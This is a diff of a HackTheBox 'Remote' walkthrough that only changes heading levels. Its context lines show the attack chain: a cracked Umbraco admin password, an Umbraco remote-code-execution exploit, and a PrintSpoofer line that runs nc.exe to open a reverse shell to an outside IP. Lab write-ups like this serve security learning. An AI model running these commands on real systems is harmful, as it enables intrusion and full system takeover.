@@ -13,15 +13,15 @@ img_path: /assets/img/hackthebox/machines/remote
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Remote](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).
 
 ![](0.png)
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -106,7 +106,7 @@ Host script results:
 
 We found an ftp server on port 21 with anonymous login enabled, an IIS http server on port 80, SMB on port 445 and NFS on port 2049 and winrm on 5985. The other port are windows ports not really helpful to us.
 
-## FTP
+### FTP
 
 Let's check the ftp server.
 
@@ -128,7 +128,7 @@ ftp>
 
 Connected to the server but couldn't find anything.
 
-## SMB
+### SMB
 
 Let's try listing shares
 
@@ -140,7 +140,7 @@ SMB         10.10.10.180    445    REMOTE           [-] remote\anonymous: STATUS
 
 Couldn't list any shares.
 
-## Web
+### Web
 
 Let's navigate to the web page.
 
@@ -156,7 +156,7 @@ Clicking on the link redirects us to a login page.
 
 This is an Umbraco login form, i tried some default credentials but wasn't successful.
 
-## NFS
+### NFS
 
 Let's check if there is any available nfs shares.
 
@@ -207,7 +207,7 @@ Let's search for Umbraco credentials in the App_Data folder.
 
 On `Umbraco.sdf` file we manage to find the admin hash.
 
-## Hashcat
+### Hashcat
 
 The hash found in a SHA1, so using hashcat mode 100, let's crack the hash.
 
@@ -251,9 +251,9 @@ We got the admin's passwords, now let's go back the Umbraco and log in.
 
 We couldn't login as `admin` but we were successful with `admin@htb.local`
 
-# **Foothold**
+## **Foothold**
 
-## Searchsploit
+### Searchsploit
 
 Searching for Umbraco in `searchsploit` we find it's vulnerable to an authenticated remote code execution.
 
@@ -293,7 +293,7 @@ iis apppool\defaultapppool
 
 Great! We got command execution.
 
-## Reverse shell
+### Reverse shell
 
 Let's get a reverse shell.
 
@@ -311,9 +311,9 @@ python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c 
 
 ![](6.png)
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
-## RoguePotato
+### RoguePotato
 
 Let's check our privileges.
 
@@ -367,7 +367,7 @@ Now back to our listener we should see a shell as System
 
 For a better understanding of the exploit check this video by `HackerSploit`: [TOken Impersonation With RoguePotato](https://www.youtube.com/watch?v=j0bh6aG1VC4)
 
-## PrintSpoofer
+### PrintSpoofer
 
 One other privilege we see is `SeAssignPrimaryTokenPrivilege`.
 
@@ -381,7 +381,7 @@ PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe 10.10.17.90 9002 -e cmd.exe" -i
 
 ![](9.png)
 
-## Intended Way
+### Intended Way
 
 After running winpeas we find that TeamViewer is listening on a local port.
 
